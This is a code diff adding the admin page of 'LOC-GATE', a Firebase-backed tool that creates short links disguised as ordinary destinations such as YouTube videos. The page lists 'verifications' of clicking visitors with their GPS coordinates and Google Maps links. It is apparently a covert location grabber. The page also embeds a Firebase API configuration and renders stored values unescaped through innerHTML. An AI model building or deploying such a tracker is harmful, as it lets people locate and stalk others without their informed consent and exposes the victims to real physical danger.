@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>LOC-GATE Admin | Short Link Creator</title>
+    <style>
+        :root {
+            --bg-dark: #070b14;
+            --card-bg: rgba(17, 25, 40, 0.82);
+            --border-glow: rgba(16, 185, 129, 0.35);
+            --neon-green: #10b981;
+            --neon-hover: #059669;
+            --text-main: #f3f4f6;
+            --text-muted: #9ca3af;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+        }
+
+        body {
+            background: radial-gradient(circle at top right, #0f2922, var(--bg-dark) 60%);
+            color: var(--text-main);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 500px;
+            background: var(--card-bg);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border: 1px solid var(--border-glow);
+            border-radius: 22px;
+            padding: 28px 24px;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.6), 0 0 25px rgba(16, 185, 129, 0.14);
+        }
+
+        .brand {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 18px;
+        }
+
+        .badge {
+            background: rgba(16, 185, 129, 0.15);
+            color: var(--neon-green);
+            border: 1px solid var(--border-glow);
+            padding: 4px 10px;
+            border-radius: 999px;
+            font-size: 12px;
+            font-weight: 600;
+        }
+
+        h1 {
+            font-size: 22px;
+            margin-bottom: 8px;
+        }
+
+        p.subtitle {
+            font-size: 13px;
+            color: var(--text-muted);
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            font-size: 13px;
+            color: var(--text-muted);
+            margin-bottom: 6px;
+        }
+
+        input[type="url"],
+        input[type="text"] {
+            width: 100%;
+            padding: 12px 14px;
+            border-radius: 12px;
+            border: 1px solid rgba(255, 255, 255, 0.12);
+            background: rgba(0, 0, 0, 0.35);
+            color: #fff;
+            font-size: 14px;
+            outline: none;
+            margin-bottom: 14px;
+        }
+
+        input:focus {
+            border-color: var(--neon-green);
+        }
+
+        .btn {
+            width: 100%;
+            padding: 13px;
+            border: none;
+            border-radius: 12px;
+            background: var(--neon-green);
+            color: #031911;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.2s;
+            box-shadow: 0 0 18px rgba(16, 185, 129, 0.35);
+        }
+
+        .btn:hover {
+            background: var(--neon-hover);
+        }
+
+        .result-box {
+            display: none;
+            margin-top: 18px;
+            padding: 14px;
+            border-radius: 12px;
+            background: rgba(16, 185, 129, 0.08);
+            border: 1px dashed var(--border-glow);
+        }
+
+        .copy-row {
+            display: flex;
+            gap: 8px;
+        }
+
+        .copy-row input {
+            margin-bottom: 0;
+        }
+
+        .copy-btn {
+            padding: 0 16px;
+            border-radius: 10px;
+            border: 1px solid var(--neon-green);
+            background: rgba(16, 185, 129, 0.2);
+            color: var(--neon-green);
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .logs-section {
+            margin-top: 24px;
+            border-top: 1px solid rgba(255, 255, 255, 0.08);
+            padding-top: 16px;
+        }
+
+        .logs-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+
+        .log-list {
+            max-height: 300px;
+            overflow-y: auto;
+        }
+
+        .log-item {
+            font-size: 12px;
+            background: rgba(0, 0, 0, 0.35);
+            padding: 11px;
+            border-radius: 10px;
+            margin-bottom: 8px;
+            border-left: 3px solid var(--neon-green);
+            line-height: 1.5;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="container">
+        <div class="brand">
+            <span class="badge">LOC-GATE ADMIN</span>
+            <span id="dbStatus" style="font-size: 12px; color: #fbbf24;">● Connecting...</span>
+        </div>
+
+        <h1>Short Gated Link Creator</h1>
+        <p class="subtitle">Generates compact <code>user.html?id=...</code> links and tracks live verifications.</p>
+
+        <label for="destInput">Destination URL (https://...)</label>
+        <input type="url" id="destInput" placeholder="https://www.youtube.com/watch?v=..." required />
+
+        <button class="btn" id="genBtn" onclick="generateShortLink()">Generate Short Link</button>
+
+        <div id="resultBox" class="result-box">
+            <label>Short Shareable Link:</label>
+            <div class="copy-row">
+                <input type="text" id="generatedUrl" readonly />
+                <button class="copy-btn" onclick="copyLink()">Copy</button>
+            </div>
+        </div>
+
+        <div class="logs-section">
+            <div class="logs-header">
+                <span style="font-size: 13px; font-weight: 600;">Live Verifications (<span
+                        id="logCount">0</span>)</span>
+                <button onclick="clearLogs()"
+                    style="background:none; border:none; color:#ef4444; font-size:12px; cursor:pointer;">Clear
+                    All</button>
+            </div>
+            <div id="logList" class="log-list">
+                <p style="font-size:12px; color:#6b7280;">Loading live data...</p>
+            </div>
+        </div>
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+        import { getDatabase, ref, set, onValue, remove } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyDDY5mO_arUXhhI-jHCxwOf5_KXrpp_DFY",
+            authDomain: "first-vigil-476213-e0.firebaseapp.com",
+            databaseURL: "https://first-vigil-476213-e0-default-rtdb.firebaseio.com",
+            projectId: "first-vigil-476213-e0",
+            storageBucket: "first-vigil-476213-e0.firebasestorage.app",
+            messagingSenderId: "463765441887",
+            appId: "1:463765441887:web:cf0d4c6ffca7036382baea",
+            measurementId: "G-SKDWC7G75X"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+        const logsRef = ref(db, 'locgate_verifications');
+        const connectedRef = ref(db, '.info/connected');
+
+        const dbStatus = document.getElementById('dbStatus');
+        onValue(connectedRef, (snap) => {
+            if (snap.val() === true) {
+                dbStatus.textContent = '● Firebase Live';
+                dbStatus.style.color = '#10b981';
+            } else {
+                dbStatus.textContent = '● Disconnected';
+                dbStatus.style.color = '#ef4444';
+            }
+        });
+
+        onValue(logsRef, (snapshot) => {
+            const logList = document.getElementById('logList');
+            const logCount = document.getElementById('logCount');
+            const data = snapshot.val();
+
+            if (!data) {
+                logCount.textContent = '0';
+                logList.innerHTML = '<p style="font-size:12px; color:#6b7280;">No verifications yet.</p>';
+                return;
+            }
+
+            const entries = Object.values(data).reverse();
+            logCount.textContent = entries.length;
+            logList.innerHTML = entries.map(item => `
+        <div class="log-item">
+          <strong>ID:</strong> ${item.shortId || 'N/A'} | <strong>Dest:</strong> ${item.dest}<br>
+          <strong>Coords:</strong> ${item.lat}, ${item.lng} (±${item.accuracy})<br>
+          <strong>Map:</strong> <a href="https://maps.google.com/?q=${item.lat},${item.lng}" target="_blank" style="color:#10b981;">Open in Google Maps</a><br>
+          <span style="color:#9ca3af;">${item.time}</span>
+        </div>
+      `).join('');
+        });
+
+        function createRandomId(length = 5) {
+            const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
+            let result = '';
+            for (let i = 0; i < length; i++) {
+                result += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            return result;
+        }
+
+        window.generateShortLink = async function () {
+            const input = document.getElementById('destInput').value.trim();
+            const genBtn = document.getElementById('genBtn');
+
+            try {
+                const validUrl = new URL(input);
+                if (validUrl.protocol !== 'http:' && validUrl.protocol !== 'https:') {
+                    alert('Enter a valid http:// or https:// URL');
+                    return;
+                }
+
+                genBtn.disabled = true;
+                genBtn.textContent = 'Creating Short Link...';
+
+                const shortId = createRandomId(5);
+                await set(ref(db, `locgate_links/${shortId}`), {
+                    dest: validUrl.href,
+                    createdAt: Date.now()
+                });
+
+                const baseFolder = window.location.href.substring(0, window.location.href.lastIndexOf('/') + 1);
+                const finalLink = `${baseFolder}user.html?id=${shortId}`;
+
+                document.getElementById('generatedUrl').value = finalLink;
+                document.getElementById('resultBox').style.display = 'block';
+            } catch (e) {
+                alert('Valid URL eta dia (jeman: https://www.youtube.com)');
+            } finally {
+                genBtn.disabled = false;
+                genBtn.textContent = 'Generate Short Link';
+            }
+        };
+
+        window.copyLink = function () {
+            const copyText = document.getElementById('generatedUrl');
+            copyText.select();
+            navigator.clipboard.writeText(copyText.value);
+            alert('Short link copied!');
+        };
+
+        window.clearLogs = function () {
+            if (confirm('Clear all verification logs?')) {
+                remove(logsRef);
+            }
+        };
+    </script>
+</body>
+
+</html>
